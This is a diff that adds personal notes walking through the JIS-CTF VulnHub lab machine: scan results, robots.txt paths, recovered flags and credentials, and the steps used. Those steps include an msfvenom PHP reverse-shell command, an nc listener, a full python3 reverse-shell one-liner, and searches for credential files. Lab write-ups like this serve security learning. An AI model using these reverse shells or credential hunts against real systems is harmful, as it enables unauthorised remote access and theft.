@@ -1,0 +1,90 @@
+JIS-CTF
+https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/
+
+5 flags
+
+1) 8734509128730458630012095
+2) 7412574125871236547895214
+3) 7645110034526579012345670
+4) 7845658974123568974185412
+5) 5473215946785213456975249
+
+credentials
+	username : admin || password : 3v1l_H@ck3r
+
+ip address 192.168.83.121
+
+ports:
+
+Nmap scan report for Jordaninfosec-CTF01 (192.168.83.121)
+Host is up (0.021s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+
+Webpage scan
+  robots.txt
+User-agent: *
+Disallow: /
+Disallow: /backup
+Disallow: /admin
+Disallow: /admin_area **
+Disallow: /r00t
+Disallow: /uploads
+Disallow: /uploaded_files  ??
+Disallow: /flag **
+
+/flag
+The 1st flag is : {8734509128730458630012095}
+
+/admin_area (source code comment)
+	username : admin
+	password : 3v1l_H@ck3r
+	The 2nd flag is : {7412574125871236547895214}
+
+/uploaded_files 
+ (blank, but no error. probably no files uploaded)
+
+
+
+Log in with U/P on login.php > File Upload Center
+
+Can upload php files - Reverse Shell available in /uploaded_files/[...]
+# msfvenom -p php/reverse_php LHOST=192.168.83.107
+# nc -lvp 4444
+
+whoami
+www-data
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+start reverse python3 shell to another local port
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.83.107",4455));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+$ find / -group www-data -type f 2>/dev/null
+
+
+$ cat /var/www/html/hint.txt
+try to find user technawi password to read the flag.txt file, you can find it in a hidden file ;)
+
+The 3rd flag is : {7645110034526579012345670}
+
+grep -rnw --exclude-dir=proc 'technawi' / 2>/dev/null
+
+$ cat /etc/mysql/conf.d/credentials.txt
+The 4th flag is : {7845658974123568974185412}
+
+username : technawi
+password : 3vilH@ksor
+
+login with SSH
+
+
+technawi@Jordaninfosec-CTF01:/var/www/html$ cat flag.txt 
+The 5th flag is : {5473215946785213456975249}
+
+Good job :)
+
+You find 5 flags and got their points and finish the first scenario....
